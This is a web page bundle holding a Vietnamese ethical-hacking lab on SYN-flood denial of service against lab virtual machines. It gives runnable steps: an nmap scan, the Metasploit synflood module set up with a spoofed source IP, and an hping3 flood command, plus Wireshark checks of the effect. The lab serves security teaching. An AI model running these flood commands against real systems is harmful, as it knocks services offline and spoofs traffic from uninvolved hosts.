import{_ as a,c as t,a1 as s,o as e}from"./chunks/framework.BDxlaA_J.js";const d=JSON.parse('{"title":"SYN Flooding","description":"","frontmatter":{},"headers":[],"relativePath":"vi/categories/ethical-hacking-labs/9-denial-of-service/1-SYN-Flooding.md","filePath":"vi/categories/ethical-hacking-labs/9-denial-of-service/1-SYN-Flooding.md"}'),i={name:"vi/categories/ethical-hacking-labs/9-denial-of-service/1-SYN-Flooding.md"};function c(o,n,p,g,r,h){return e(),t("div",null,n[0]||(n[0]=[s(`<h1 id="syn-flooding" tabindex="-1">SYN Flooding <a class="header-anchor" href="#syn-flooding" aria-label="Permalink to &quot;SYN Flooding&quot;">​</a></h1><p>SYN flood là một hình thức tấn công từ chối dịch vụ trong đó kẻ tấn công gửi một loạt các yêu cầu SYN liên tiếp đến máy mục tiêu nhằm cạn kiệt tài nguyên và khiến nó không phản hồi với lưu lượng hợp lệ đến.</p><p align="center"><img width="70%" src="https://www.researchgate.net/profile/Pratick_Bakhtiani/publication/304092271/figure/fig4/AS:374545031680000@1466309902047/TCP-SYN-flooding-attack-8.png"></p><p>Một phiên TCP thiết lập kết nối bằng cơ chế bắt tay ba bước (three-way handshake).Nguồn gửi gói SYN đến đích. Đích, khi nhận gói SYN, phản hồi bằng cách gửi gói SYN/ACK về nguồn. Gói SYN/ACK này xác nhận sự đến của gói SYN đầu tiên cho nguồn. Cuối cùng, nguồn gửi gói ACK cho gói ACK/SYN được gửi bởi đích. Trong tấn công SYN, kẻ tấn công khai thác phương pháp bắt tay ba bước. Đầu tiên, kẻ tấn công gửi một yêu cầu TCP SYN giả đến máy chủ mục tiêu, và khi máy chủ gửi SYN/ACK để phản hồi yêu cầu của client (kẻ tấn công), client không bao giờ gửi phản hồi ACK. Điều này khiến máy chủ chờ đợi để hoàn thành kết nối.</p><p align="center"><img width="70%" src="https://www.cloudflare.com/img/learning/ddos/syn-flood-ddos-attack/syn-flood-attack-ddos-attack-diagram-1.png"></p><hr><h3 id="muc-tieu" tabindex="-1">Mục tiêu <a class="header-anchor" href="#muc-tieu" aria-label="Permalink to &quot;Mục tiêu&quot;">​</a></h3><ul><li>Giả mạo địa chỉ IP của máy tấn công</li><li>Thực hiện SYN Flooding trên máy mục tiêu</li></ul><h3 id="yeu-cau" tabindex="-1">Yêu cầu <a class="header-anchor" href="#yeu-cau" aria-label="Permalink to &quot;Yêu cầu&quot;">​</a></h3><ul><li>Máy ảo Kali Linux</li><li>Máy ảo Windows 10 (tắt Firewall)</li><li>Máy ảo Windows Server 2012 hoặc 2016</li></ul><h2 id="kiem-tra-cong-mo" tabindex="-1">Kiểm tra cổng mở <a class="header-anchor" href="#kiem-tra-cong-mo" aria-label="Permalink to &quot;Kiểm tra cổng mở&quot;">​</a></h2><p>Đăng nhập vào Kali Linux và mở một cửa sổ terminal mới.</p><p>Chúng ta sẽ thực hiện SYN flooding trên Windows 10 thông qua một <strong>cổng mở</strong>. Để kiểm tra cổng nào đang mở, chúng ta sẽ sử dụng Nmap để quét tất cả các cổng mở.</p><p><code>nmap -p- &lt;Windows 10 IP address&gt;</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>PORT      STATE SERVICE</span></span>
<span class="line"><span>135/tcp   open  msrpc</span></span>
<span class="line"><span>139/tcp   open  netbios-ssn</span></span>
<span class="line"><span>445/tcp   open  microsoft-ds</span></span>
<span class="line"><span>5040/tcp  open  unknown</span></span>
<span class="line"><span>7680/tcp  open  pando-pub</span></span>
<span class="line"><span>49664/tcp open  unknown</span></span>
<span class="line"><span>49665/tcp open  unknown</span></span>
<span class="line"><span>49666/tcp open  unknown</span></span>
<span class="line"><span>49668/tcp open  unknown</span></span>
<span class="line"><span>49669/tcp open  unknown</span></span>
<span class="line"><span>49670/tcp open  unknown</span></span>
<span class="line"><span>49671/tcp open  unknown</span></span></code></pre></div><p>Trong bài lab này, chúng ta sẽ sử dụng một module auxiliary từ <strong>Metasploit</strong> có tên <strong>synflood</strong> để thực hiện tấn công DoS trên mục tiêu sử dụng cổng 445.</p><h2 id="thuc-hien-tan-cong-dos" tabindex="-1">Thực hiện tấn công DoS <a class="header-anchor" href="#thuc-hien-tan-cong-dos" aria-label="Permalink to &quot;Thực hiện tấn công DoS&quot;">​</a></h2><p>Gõ <strong>msfconsole</strong> để khởi chạy Metasploit Framework.</p><p><code>msfconsole</code></p><p>Nhập lệnh để tải module:</p><p><code>use auxiliary/dos/tcp/synflood</code></p><p>Để hiển thị tất cả các tùy chọn của module, gõ:</p><p><code>options</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>Name       Current Setting  Required  Description</span></span>
<span class="line"><span>----       ---------------  --------  -----------</span></span>
<span class="line"><span>INTERFACE                   no        The name of the interface</span></span>
<span class="line"><span>NUM                         no        Number of SYNs to send (else unlimited)</span></span>
<span class="line"><span>RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span></span>
<span class="line"><span>RPORT      80               yes       The target port</span></span>
<span class="line"><span>SHOST                       no        The spoofable source address (else randomizes)</span></span>
<span class="line"><span>SNAPLEN    65535            yes       The number of bytes to capture</span></span>
<span class="line"><span>SPORT                       no        The source port (else randomizes)</span></span>
<span class="line"><span>TIMEOUT    500              yes       The number of seconds to wait for new data</span></span></code></pre></div><p>Chúng ta sẽ thay đổi các tham số RHOST, RPORT và SHOST:</p><p><code>set RHOST [IP address of Windows 10]</code><code>set RPORT 445</code><code>set SHOST [IP address of Windows Server]</code></p><p>Bằng cách đặt tùy chọn <strong>SHOST</strong> thành địa chỉ IP của Windows Server, bạn đang giả mạo địa chỉ IP của máy Kali Linux.</p><p>Khi module auxiliary đã được cấu hình, bắt đầu tấn công DoS trên Windows 10 bằng cách gõ:</p><p><code>run</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-0.png" alt="synflood"></p><p>Điều này bắt đầu cuộc tấn công SYN flooding trên Windows 10.</p><h2 id="kiem-tra-cuoc-tan-cong-dos" tabindex="-1">Kiểm tra cuộc tấn công DoS <a class="header-anchor" href="#kiem-tra-cuoc-tan-cong-dos" aria-label="Permalink to &quot;Kiểm tra cuộc tấn công DoS&quot;">​</a></h2><p>Chuyển sang máy Windows 10 và khởi chạy <a href="https://www.wireshark.org/" target="_blank" rel="noreferrer"><strong>Wireshark</strong></a>, chọn đúng giao diện mạng và nhấp bắt đầu.</p><p>Wireshark hiển thị lưu lượng truy cập đến từ máy như hình dưới:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-wireshark-4.png" alt="wireshark-synflood-detect"></p><p>Tại đây, bạn có thể quan sát rằng địa chỉ IP nguồn là từ Windows Server. Điều này ngụ ý rằng địa chỉ IP của Kali Linux đã bị giả mạo.</p><p>Tiếp theo, mở <strong>Task Manager</strong> trên Windows 10 và nhấp vào tab <strong>performance</strong>.</p><p>Bạn sẽ quan sát thấy rằng mức sử dụng CPU và Ethernet đã tăng đáng kể sau cuộc tấn công, điều này ngụ ý rằng cuộc tấn công DoS đang diễn ra. Nếu cuộc tấn công được tiếp tục trong một thời gian, tài nguyên của máy sẽ bị cạn kiệt hoàn toàn và nó sẽ ngừng phản hồi.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/50372a5d43eb96f78aa8886cb7b3eef9b1d417eb/synflood-task-manager-2.png" alt="task-manager"></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/9f36f0e0d55c0b7429e547dd93c7c55c55b96ea4/synflood-task-manager-1.png" alt="task-manager-2"></p><p>Để dừng tấn công DoS, quay lại Metasploit trên Kali và nhấn <strong>Ctrl+C</strong> để chấm dứt tấn công.</p><h1 id="syn-flooding-bang-hping3" tabindex="-1">SYN Flooding bằng hping3 <a class="header-anchor" href="#syn-flooding-bang-hping3" aria-label="Permalink to &quot;SYN Flooding bằng hping3&quot;">​</a></h1><p>hping3 là một công cụ lắp ráp/phân tích gói TCP/IP dòng lệnh.</p><p>Để tìm hiểu thêm về <strong>hping3</strong> bạn có thể xem <a href="https://github.com/Samsar4/Ethical-Hacking-Labs/blob/master/2-Scanning-Networks/1-hping3.md" target="_blank" rel="noreferrer">module này</a>.</p><h2 id="thuc-hien-syn-flooding-bang-hping3" tabindex="-1">Thực hiện SYN flooding bằng hping3 <a class="header-anchor" href="#thuc-hien-syn-flooding-bang-hping3" aria-label="Permalink to &quot;Thực hiện SYN flooding bằng hping3&quot;">​</a></h2><p><code>hping3 -S [Windows 10 IP address] -a [Kali IP address] -p 22 --flood</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/72394c4deaa152f806930cd26a1e4cf424b3e77a/syn-2.png" alt="syn2"></p><p>Điều này bắt đầu cuộc tấn công SYN flooding trên Windows 10.</p><p>Hping3 tràn ngập máy nạn nhân bằng cách gửi hàng loạt <strong>gói SYN</strong> và <strong>quá tải</strong> tài nguyên nạn nhân.</p><p>Chuyển sang Windows 10 và khởi chạy <a href="https://www.wireshark.org/" target="_blank" rel="noreferrer">Wireshark</a>, chọn đúng giao diện mạng và bắt đầu bắt gói tin.</p><p>Phân tích lưu lượng đã bắt, bạn sẽ nhận thấy số lượng lớn <strong>gói SYN</strong>, có thể khiến máy mục tiêu bị lỗi.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/72394c4deaa152f806930cd26a1e4cf424b3e77a/syn-wireshark-2.png" alt="wireshark2"></p>`,52)]))}const u=a(i,[["render",c]]);export{d as __pageData,u as default};
